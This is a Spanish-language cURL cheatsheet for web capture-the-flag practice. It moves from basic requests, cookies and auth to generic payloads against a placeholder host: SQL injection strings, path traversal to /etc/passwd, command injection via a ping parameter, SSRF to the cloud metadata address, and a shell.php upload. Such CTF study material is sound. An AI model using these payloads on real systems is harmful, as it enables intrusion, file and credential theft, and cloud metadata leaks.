
# Cheatsheet cURL para CTF Web

Tags: #ctf #web #curl
## Básicos

```bash
# Buscar texto específico en todos los archivos de una carpeta:
grep -rnw . -e "CTF{"

```


```bash
# GET simple
curl http://target.com/

# Ver solo headers de respuesta
curl -I http://target.com/

# Ver headers + body, verbose (muestra request y response headers)
curl -v http://target.com/

# Seguir redirecciones
curl -L http://target.com/

# Guardar respuesta en archivo
curl -o salida.html http://target.com/

# Ignorar certificado SSL inválido (self-signed, típico en CTF)
curl -k https://target.com/
```

---

## Enviar datos (POST)

```bash
# POST con datos tipo formulario
curl -X POST -d "user=admin&pass=1234" http://target.com/login

# POST con JSON
curl -X POST -H "Content-Type: application/json" \
  -d '{"user":"admin","pass":"1234"}' \
  http://target.com/api/login

# POST leyendo body desde archivo
curl -X POST -d @body.json -H "Content-Type: application/json" \
  http://target.com/api/login

# Subir archivo (multipart/form-data)
curl -X POST -F "file=@shell.php" -F "submit=Upload" \
  http://target.com/upload.php
```

---

## Headers y cookies

```bash
# Mandar header custom
curl -H "X-Forwarded-For: 127.0.0.1" http://target.com/

# Mandar varios headers
curl -H "User-Agent: Mozilla/5.0" -H "X-Api-Key: test123" http://target.com/

# Mandar cookie
curl -b "PHPSESSID=abc123" http://target.com/

# Guardar cookies que devuelve el server
curl -c cookies.txt http://target.com/login

# Reusar cookies guardadas
curl -b cookies.txt http://target.com/dashboard

# Ver todos los headers de la respuesta (útil para buscar flags en headers)
curl -sD - -o /dev/null http://target.com/
```

---

## Autenticación

```bash
# Basic Auth
curl -u admin:admin123 http://target.com/panel

# Bearer token (JWT, APIs)
curl -H "Authorization: Bearer eyJhbGciOi..." http://target.com/api/me
```

---

## Fuzzing / enumeración rápida sin herramientas externas

```bash
# Probar una lista de rutas con un for loop
for path in admin backup config .git .env robots.txt; do
  code=$(curl -s -o /dev/null -w "%{http_code}" http://target.com/$path)
  echo "$path -> $code"
done

# Fuzzing de parámetro id (probar rango de IDs, IDOR)
for i in $(seq 1 20); do
  echo "== id=$i =="
  curl -s "http://target.com/user?id=$i" | grep -i "flag\|admin"
done
```

---

## SQLi manual rápido

```bash
# Probar comilla simple
curl "http://target.com/item?id=1'"

# OR clásico
curl "http://target.com/item?id=1' OR '1'='1"

# UNION-based (ajustar número de columnas)
curl "http://target.com/item?id=-1' UNION SELECT 1,2,3-- -"

# Time-based blind (medir con -w)
curl -s -o /dev/null -w "Tiempo: %{time_total}s\n" \
  "http://target.com/item?id=1' AND SLEEP(3)-- -"

# En POST
curl -X POST -d "id=1' OR '1'='1" http://target.com/search
```

---

## LFI / Path Traversal

```bash
curl "http://target.com/page?file=../../../../etc/passwd"

curl "http://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"

# Con codificación URL manual
curl "http://target.com/page?file=..%2f..%2f..%2fetc%2fpasswd"
```

---

## Command Injection

```bash
curl "http://target.com/ping?host=127.0.0.1;whoami"
curl "http://target.com/ping?host=127.0.0.1%26%26id"
curl -X POST -d "host=127.0.0.1|cat /flag.txt" http://target.com/ping
```

---

## SSRF

```bash
curl -X POST -d "url=http://127.0.0.1:80/admin" http://target.com/fetch
curl -X POST -d "url=http://169.254.169.254/latest/meta-data/" http://target.com/fetch
```

---

## Descargar y decodificar en un solo paso

```bash
# Bajar respuesta y decodificar base64 directo
curl -s http://target.com/secret | base64 -d

# Bajar y buscar patrón de flag
curl -s http://target.com/ | grep -oE "flag\{[^}]*\}"
```

---

## Medir tiempos / status codes en bulk (para blind SQLi o fuzzing manual)

```bash
curl -s -o /dev/null -w "status=%{http_code} time=%{time_total} size=%{size_download}\n" \
  "http://target.com/item?id=1"
```

---

## Notas rápidas

- `-s` = silencioso (sin barra de progreso)
- `-i` = incluir headers de respuesta en el output
- `-X` = método HTTP explícito
- `-w` = formato de salida custom, muy útil para automatizar con `for`/`while`
- Combinar con `grep`, `watch`, o loops de bash cuando no tenés IA a mano